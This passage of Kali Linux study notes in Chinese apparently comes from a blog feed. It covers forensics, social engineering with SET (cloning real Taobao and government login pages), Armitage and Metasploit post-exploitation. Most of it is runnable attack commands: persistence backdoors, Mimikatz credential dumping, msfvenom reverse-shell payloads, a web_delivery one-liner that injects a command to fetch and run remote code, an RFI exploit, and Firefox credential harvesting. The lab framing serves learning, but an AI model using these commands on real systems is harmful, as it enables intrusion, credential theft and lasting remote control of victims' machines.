<li>使用干净U盘的操作系统命令可能也会占用内存资源，破坏现场</li>
<li>▲ 虚拟机一定程度上通过控制台可实现不破坏数据现场</li>
</ul>
</li>
<li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li>
<li>系统内存是主要的易失性存储介质取证对象，不修改无法获取其中数据<ul>
<li>程序、操作系统指令会对内存进行修改</li>
</ul>
</li>
<li>非易失性存储介质通常使用完整镜像拷贝保存<ul>
<li>不同于文件拷贝，从磁道层面的复制（01代码的复制，可能包含已删除的文件）</li>
</ul>
</li>
<li>正常关机还是直接拔掉电源（数据丢失破坏）<ul>
<li>拔电源：存在于内存中的数据无法保存到硬盘</li>
<li>正常关机：木马程序可能进行数据擦除破坏</li>
<li>▲ 建议拔电源，Ext4日志型文件型系统直接拔电源，不会丢失日志</li>
</ul>
</li>
</ul>
</li>
<li>证据搜索<ul>
<li>数据（数据提炼）</li>
<li>信息（信息收集）</li>
<li>证据（得出入侵的证据 → 法庭的呈堂证供/技术分析）</li>
</ul>
</li>
<li>作为安全从业者<ul>
<li>通过取证还原黑客入侵的轨迹</li>
<li>作为渗透测试和黑客攻击区分标准<ul>
<li>世纪佳缘事件</li>
<li>印象笔记渗透测试事件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-取证方法"><a href="#4-取证方法" class="headerlink" title="4. 取证方法"></a>4. 取证方法</h4><ul>
<li>活取证（服务器未关机，可对内存和硬盘取证）<ul>
<li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li>
<li>使用未受感染的干净程序执行取证</li>
<li>U盘 / 网络存储收集到的数据</li>
<li>▲ 新建用户取证</li>
</ul>
</li>
<li>死取证（服务器关机、可对硬盘取证）<ul>
<li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）<ul>
<li>硬盘格式<ul>
<li>大块MBR</li>
<li>全局分区表GPT</li>
<li>逻辑卷LVM</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-取证工具–Dumpit"><a href="#5-取证工具–Dumpit" class="headerlink" title="5. 取证工具–Dumpit"></a>5. 取证工具–Dumpit</h4><ul>
<li>不考虑法律因素、法庭证据、监管链、文档记录等取证环节</li>
<li>只介绍Kali当中部分取证工具的使用方法</li>
<li>内存dump工具<ul>
<li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip</a><ul>
<li>▲ 2020.03.04 此连接失效，改为后续链接：<a href="http://www.secist.com/archives/2076.html" target="_blank" rel="noopener">http://www.secist.com/archives/2076.html</a></li>
</ul>
</li>
<li>内存文件与内存大小接近或者稍微大一点，raw格式</li>
</ul>
</li>
<li>实验<ul>
<li>Window 7</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=2638rdSKJV3HVd-tYIUJnkoRfqNDQSyiuMX3yluETjB9O1Ve6zMIW2fFmrDkG0M3vtkS580i71YLHOwz3PrU-Gb7Af2x256yinj9RuvNRJ54sAwdNjtm&file_name=/Dumpit.png" srcset="/img/loading.gif" alt="Dumpit"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十四)：社会工程学</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
    <content><![CDATA[<hr>
<h4 id="1-新闻插播"><a href="#1-新闻插播" class="headerlink" title="1. 新闻插播"></a>1. 新闻插播</h4><ul>
<li>Metasploit被发现两个远程代码执行漏洞<ul>
<li>问题都出在WEB组件方面</li>
<li>MSF不受影响</li>
</ul>
</li>
<li>安全面前软软平等<ul>
<li>没有没有漏洞的软件</li>
</ul>
</li>
</ul>
<h4 id="2-社会工程学"><a href="#2-社会工程学" class="headerlink" title="2. 社会工程学"></a>2. 社会工程学</h4><ul>
<li>为什么在这说社会工程学（Social Engineering）<ul>
<li>Metasploit可以很好的配合到社会工程学攻击的各个阶段</li>
<li>Setoolkit工具包大量依赖Metasploit</li>
<li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li>
</ul>
</li>
</ul>
<p>![THE ART OF DECEPTION](/images/kali/kali-notepad/THE ART OF DECEPTION.jpg)</p>
<p><img src="/images/kali/kali-notepad/%E5%85%A5%E4%BE%B5%E7%9A%84%E8%89%BA%E6%9C%AF.png" srcset="/img/loading.gif" alt="入侵的艺术"></p>
<ul>
<li>社会工程学<ul>
<li>社会：人式社会化的动物（人与人之间的关系，群体利益决定结构架构）</li>
<li>工程：依据标准的步骤完成任务达成目标的一套方法</li>
<li>通过人的交流，使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li>
</ul>
</li>
<li>社会工程学攻击的四个阶段<ul>
<li>研究：信息收集（WEB、媒体、垃圾桶、物理），确定并研究目标人</li>
<li>钩子：与目标建立第一次交谈（Hook、下套）</li>
<li>下手：与目标建立信任并获取信息</li>
<li>退场：不引起目标怀疑的离开攻击现场</li>
</ul>
</li>
<li>类型<ul>
<li>基于人的社工<ul>
<li>搭载</li>
<li>伪造身份</li>
<li>偷听 / 窃肩</li>
<li>▲ 反社工</li>
<li>垃圾桶工程</li>
</ul>
</li>
<li>基于计算机的社工<ul>
<li>弹出窗口</li>
<li>内部网络攻击</li>
<li>钓鱼邮件</li>
<li>419尼日利亚骗局</li>
<li>短信诈骗</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-Social-Engineer-Toolkit（SET）"><a href="#3-Social-Engineer-Toolkit（SET）" class="headerlink" title="3. Social-Engineer Toolkit（SET）"></a>3. Social-Engineer Toolkit（SET）</h4><ul>
<li>Socia-Engineering Attacks<ul>
<li>Spear Phishing Attack Vectors<ul>
<li>Perform a Mass Email Attack（多个Email地址发送）</li>
<li>▲ Create a FileFormat Payload（Payload-Email发送）<ul>
<li>PAYLOADS</li>
</ul>
</li>
<li>Create a Social-Engineering Template（模板Email发送）</li>
</ul>
</li>
<li>Website Attack Vectors（Web攻击向量）<ul>
<li>Java Applet Attack Method</li>
<li>Metasploit Browser Exploit Attack Method</li>
<li>Credential Harvester Attack Method<ul>
<li>Web Templates</li>
<li>Site Cloner（克隆站点，apache_dir/harvester_data.txt）<ul>
<li>Kali的IP</li>
<li>URL地址</li>
<li>▲ 第一次网址为伪造，第二次网址为正确的网址</li>
</ul>
</li>
<li>Custom Import</li>
</ul>
</li>
<li>Tabnabbing Attack Method</li>
<li>Web Jacking Attack Method</li>
<li>Multi-Attack Web Method</li>
<li>Full Screen Attack Method</li>
<li>HTA Attack Method</li>
</ul>
</li>
<li>Infectius Media Generator（感染媒体，USB/CD/DVD → autorun.inf）</li>
<li>Create a Payload and Listener（MSF监听功能，/root/.set/payload.exe，调用MSF控制窗口进行侦听）</li>
<li>Mass Mailer Attack（大量钓鱼邮件）</li>
<li>Arduio-Based Attack Vector（Arduio嵌入开发）</li>
<li>Wireless Access Point Attack Vector（伪造无线AP）<ul>
<li>安装DHCP服务</li>
<li>手段配置</li>
</ul>
</li>
<li>QRCode Generator Attack Vector（生成一个二维码，绑定一个Payload）<ul>
<li>漏洞利用URL地址（/root/.set/reports/qcode_attack.png）</li>
</ul>
</li>
<li>Powsershell Attack Vectors（Powershell脚本）</li>
<li>SMS SPoofing Attack Vector（欺骗短信，但需要提前到指定网站注册购买短信服务）</li>
<li>Third Party Modules（第三方模块，可添加）</li>
</ul>
</li>
<li>⭐ 站点克隆 1 2 3 2<ul>
<li><a href="https://login.taobao.com/member/login.jhtml" target="_blank" rel="noopener">https://login.taobao.com/member/login.jhtml</a> </li>
<li><a href="http://admin.smeshx.gov.cn/login.php" target="_blank" rel="noopener">http://admin.smeshx.gov.cn/login.php</a></li>
</ul>
</li>
<li>⭐ 发送钓鱼软件 1 1 2</li>
<li>⭐ WEB站点攻击 1 2 1 2</li>
<li>▲ 2020.03.04 Github地址：<a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></li>
<li>▲ 2020.03.04 此项目依旧在维护更新，且呈现一种框架性的趋势</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十三)：Armitage</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/</url>
    <content><![CDATA[<hr>
<h4 id="1-Armitage图形化前端"><a href="#1-Armitage图形化前端" class="headerlink" title="1. Armitage图形化前端"></a>1. Armitage图形化前端</h4><ul>
<li>开源免费图形前端<ul>
<li>基于JAVA开发的界面</li>
<li>作者自称是众多不会使用metasploit的安全专家之一（命令行）</li>
<li>MSF基于命令行，缺少直观的GUI图形用户接口</li>
</ul>
</li>
<li>Armitage只是调用MSF的漏洞利用能力<ul>
<li>Armitage的每一个GUI操作都可以对应对应MSF中一条命令</li>
</ul>
</li>
<li>红队团队合作模拟对抗<ul>
<li>分为客户端（armitage）和服务器（msfrpcd）两部分</li>
<li>/usr/share/armitage/teamserver ip password</li>
<li>▲ 允许多个客户端连接一个服务器，监听55553</li>
</ul>
</li>
<li>可脚本化</li>
<li>启动方式<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>Teamserver<ul>
<li>服务端：<strong><code>🔺命令：./teamserver 服务器IP 连接密码</code></strong></li>
<li>客户端：<strong><code>🔺命令：armitage</code></strong></li>
</ul>
</li>
<li>单机启动<br>  -<strong><code>🔺命令：Armitage</code></strong> <ul>
<li>GUI启动</li>
<li>127.0.0.1 55553</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Armitage"><a href="#2-实验–Armitage" class="headerlink" title="2. 实验–Armitage"></a>2. 实验–Armitage</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>单机使用：点击Armitage的图标（127.0.0.1 / 55553）</li>
<li>界面使用</li>
<li><strong><code>🔺命令：cd /usr/share/armitage</code></strong></li>
<li><strong><code>🔺命令：./teamserver Kali的IP pass123</code></strong></li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Tom）</li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Jan）</li>
</ul>
</li>
</ul>
<h4 id="3-Armitage图形化前端"><a href="#3-Armitage图形化前端" class="headerlink" title="3. Armitage图形化前端"></a>3. Armitage图形化前端</h4><ul>
<li>发现主机（顶栏 → Hosts）<ul>
<li>Add Hosts：手动添加IP地址</li>
<li>Import Hosts：扫描结果导入XML文件（nmap、nessus openvas、appscan、nexpose、awvs）</li>
<li>NMAP Scan/MSF Scan：直接扫描发现（nmap、msf）</li>
<li>DNS Enumerate：DNS枚举发现</li>
</ul>
</li>
<li>扫描端口及服务</li>
<li>工作区workspace<ul>
<li>个人视角的目标动态显示筛选，同一team的队员自定义工作区</li>
<li>基于地址的工作区划分</li>
<li>基于端口的工作区划分</li>
<li>基于操作系统的工作区划分</li>
<li>基于标签的工作区划分</li>
</ul>
</li>
<li>生成Payload<ul>
<li>reverse_tcp</li>
<li>bind_hidden_tcp（只有在AHOST主动连接时，才监听4444端口）</li>
<li>bind_tcp</li>
</ul>
</li>
<li>主动获取目标<ul>
<li>ms08_067</li>
</ul>
</li>
<li>被动获得目标<ul>
<li>Browser_autopwn2（伪造网站进行被动攻击）</li>
</ul>
</li>
<li>Meterpreter shell 能力展示<ul>
<li>空密码：aa63…. / 316c</li>
<li>Poviting → ARP Scan（层级结构）</li>
</ul>
</li>
<li>菜单功能<ul>
<li>SOCKS4（用Kali做跳板机，通过建立的meterpreter隧道进行内网漫游）</li>
<li>Script（可添加script脚本，比如Cortana脚本）</li>
</ul>
</li>
<li>Cortana脚本<ul>
<li>Veil-Evasionғ/use/share/veil-evasion/tools/cortana/veil_evasion.cna </li>
<li><a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a></li>
</ul>
</li>
<li>别无他法的的最后选择<ul>
<li>Attacks<ul>
<li>Find Attacks   # 自动分析匹配漏洞利用模块（智能分析分配模块的尝试）</li>
<li>Hail Mary #上帝啊！赐于我力量吧！（端口进行所有模块的尝试，Great级别以上）</li>
<li>洪水式漏洞利用代码执行，流量及特征明显，容易被发现</li>
</ul>
</li>
</ul>
</li>
<li>Armitage现状<ul>
<li>维护不及时，传言此项目已荒废</li>
<li>仍然式目前唯一开源免费的metasploit图形前端</li>
</ul>
</li>
<li>Cobalt Strike</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十二)：MSF延展用法</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<hr>
<h4 id="1-MSF延展用法–Meterpreter后门"><a href="#1-MSF延展用法–Meterpreter后门" class="headerlink" title="1. MSF延展用法–Meterpreter后门"></a>1. MSF延展用法–Meterpreter后门</h4><ul>
<li>持久后门<ul>
<li>利用漏洞取得的meterpreter shell运行于内存，重启失效</li>
<li>重复exploit漏洞可能造成服务崩溃</li>
<li>持久后门保证漏洞修复后仍可远程控制</li>
</ul>
</li>
<li>Meterpreter后门–metsvc<ul>
<li>▲ metsvc不能改端口，不支持身份验证</li>
<li><strong><code>🔺命令：run metsvc -h</code></strong> <ul>
<li>-A：自动启动/exploit/multi/handle监听</li>
<li>-r：删除监听</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong>  </li>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong>  <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong>  </li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST 1.1.1.1</code></strong> </li>
</ul>
</li>
<li>Meterpreter后门–persistence<ul>
<li>▲ 添加VBS脚本，并在注册表添加启动项</li>
<li><strong><code>🔺命令：run persistence -h</code></strong> <ul>
<li>默认使用windows/meterprter/reverse_tcp</li>
<li>-X：自动启动agent当机器开机</li>
<li>-r：要连接的IP</li>
<li>-p：要连接的端口</li>
</ul>
</li>
<li><strong><code>🔺命令：run persistence -X -i 10 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -U -i 20 -p 4444 -r 1.1.1.1</code></strong>  </li>
<li><strong><code>🔺命令：run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="2-MSF延展用法–Mimikatz"><a href="#2-MSF延展用法–Mimikatz" class="headerlink" title="2. MSF延展用法–Mimikatz"></a>2. MSF延展用法–Mimikatz</h4><ul>
<li>hashdump使用的就是Minikatz的部分功能<ul>
<li><strong><code>🔺命令：getsystem</code></strong>  </li>
<li><strong><code>🔺命令：load mimikatz</code></strong>  </li>
<li>wdigest、kerberos、msv、ssp、tspkg、livessp<ul>
<li>msv：账号加密信息</li>
<li>ssp：账号不加密信息</li>
<li>tspkg：kerveros身份票据信息</li>
<li>wdigest：从内存中获取账号明文密码</li>
<li>kerboros：从内存中获取账号明文密码</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong>  <ul>
<li>-a：使用具体模块所需要的子参数</li>
<li>-f：使用的模块</li>
</ul>
</li>
<li>查看模块（使用不存在模块，报错显示）：<strong><code>🔺命令：mimikatz_command -f a::</code></strong>  </li>
<li>查看系统账号哈希：<strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong></li>
<li>查看操作系统进程：<strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li>查看操作系统服务：<strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li>查看操作系统支持的加密：<strong><code>🔺命令：mimikatz_command -fcrypto::listProviders</code></strong> </li>
<li>查看地雷雷数：<strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong><ul>
<li>▲ winmine：扫雷游戏</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-MSF延展用法–PHP-shel-Web-Delivery"><a href="#3-MSF延展用法–PHP-shel-Web-Delivery" class="headerlink" title="3. MSF延展用法–PHP shel/Web Delivery"></a>3. MSF延展用法–PHP shel/Web Delivery</h4><ul>
<li>PHP shell<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></strong></li>
<li>MSF启动侦听</li>
<li>上传到web站点并通过浏览器访问<ul>
<li>Web Delivery</li>
<li>利用代码执行漏洞访问攻击者服务器，从攻击者服务器下载远程执行代码，执行下载的代码后反弹一个shell给攻击者的服务器</li>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong> </li>
<li><strong><code>🔺命令：set target 1</code></strong> </li>
<li><strong><code>🔺命令：;php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/ fTYWqmu&#39;));&quot;</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-MSF延展用法–RFI远程文件包含"><a href="#4-MSF延展用法–RFI远程文件包含" class="headerlink" title="4. MSF延展用法–RFI远程文件包含"></a>4. MSF延展用法–RFI远程文件包含</h4><ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On </li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> </li>
<li><strong><code>🔺命令：set RHOST 1.1.1.2</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set lhost 1.1.1.1 – exploit</code></strong></li>
</ul>
<h4 id="5-实验准备"><a href="#5-实验准备" class="headerlink" title="5. 实验准备"></a>5. 实验准备</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Window XP的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
<li>Metasploit<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
<h4 id="6-实验–metsvc"><a href="#6-实验–metsvc" class="headerlink" title="6. 实验–metsvc"></a>6. 实验–metsvc</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run metsvc -h</code></strong></li>
<li><strong><code>🔺命令：run metsvc -A</code></strong>（31337）</li>
<li>查看是否拿到shell</li>
<li>在window 7的计算机管理查看是否开启服务meterpreter → metsvc</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LPORT 31337</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
</li>
</ul>
<h4 id="7-实验–persistence"><a href="#7-实验–persistence" class="headerlink" title="7. 实验–persistence"></a>7. 实验–persistence</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：run persistence -h</code></strong></li>
<li><strong><code>🔺命令：run persistence -X -p 4444 -r Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterprter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window XP的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong><ul>
<li><strong><code>🔺命令：set exitonsession false</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>重新启动</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
</ul>
<h4 id="8-实验–Mimikatz"><a href="#8-实验–Mimikatz" class="headerlink" title="8. 实验–Mimikatz"></a>8. 实验–Mimikatz</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getsystem</code></strong></li>
<li><strong><code>🔺命令：load mimikatz</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -h</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f a::</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f crypto::listProviders</code></strong> </li>
<li><strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong></li>
</ul>
</li>
</ul>
<h4 id="9-实验–PHP-shell"><a href="#9-实验–PHP-shell" class="headerlink" title="9. 实验–PHP shell"></a>9. 实验–PHP shell</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=3333 -f raw -o a.php</code></strong> </li>
<li><strong><code>🔺命令：scp a.php msfadmin@Metasploit的IP:/home/msfadmin</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 3333</code></strong></li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：sudo cp a.php /var/www</code></strong></li>
<li><strong><code>🔺命令：ls /var/www</code></strong>（查看是否已经复制）</li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/a.php" target="_blank" rel="noopener">http://Metasploit的IP/a.php</a></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="10-实验–Web-Delivery"><a href="#10-实验–Web-Delivery" class="headerlink" title="10. 实验–Web Delivery"></a>10. 实验–Web Delivery</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong><ul>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：set target 1</code></strong>（PHP）</li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问<a href="http://Metasploit的IP，访问DVWA" target="_blank" rel="noopener">http://Metasploit的IP，访问DVWA</a></li>
<li>设置安全级别为低</li>
<li>在Cmomand Exection中执行生成的命令行<strong><code>🔺命令：;php -d allow url fopen=true -r &quot;eval(file get contents(&#39;http://Kali的IP:8080/&#39;));&quot;</code></strong></li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-实验–RFI远程文件包含"><a href="#11-实验–RFI远程文件包含" class="headerlink" title="11. 实验–RFI远程文件包含"></a>11. 实验–RFI远程文件包含</h4><ul>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试" target="_blank" rel="noopener">http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试</a></li>
</ul>
</li>
<li>Metasploit<ul>
<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
<li>allow_url_fopen = On </li>
<li>allow_url_include = On</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo /etc/init.d apache2 restart</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>浏览器访问<a href="http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php" target="_blank" rel="noopener">http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php</a> ，远程文件包含测试</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> <ul>
<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong> </li>
<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set lhost Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否能直接拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li>▲ 2020.03.04 Exploit completed,but no session was created</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十一)：MSF模块--Posting</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/</url>
    <content><![CDATA[<hr>
<h4 id="1-POST模块"><a href="#1-POST模块" class="headerlink" title="1. POST模块"></a>1. POST模块</h4><ul>
<li>ARP扫描：<strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong> </li>
<li>虚拟机检测：<strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li>身份信息收集：<strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong> </li>
<li>枚举应用程序：<strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong> </li>
<li>枚举目标机器账号登陆：<strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong> </li>
<li>枚举SNMP服务：<strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong> </li>
<li>本地存在漏洞：<strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong> </li>
<li>删除用户账号：<strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong> </li>
<li>运行环境变量信息：<strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li>收集firefox保存的浏览器的账号密码：<strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
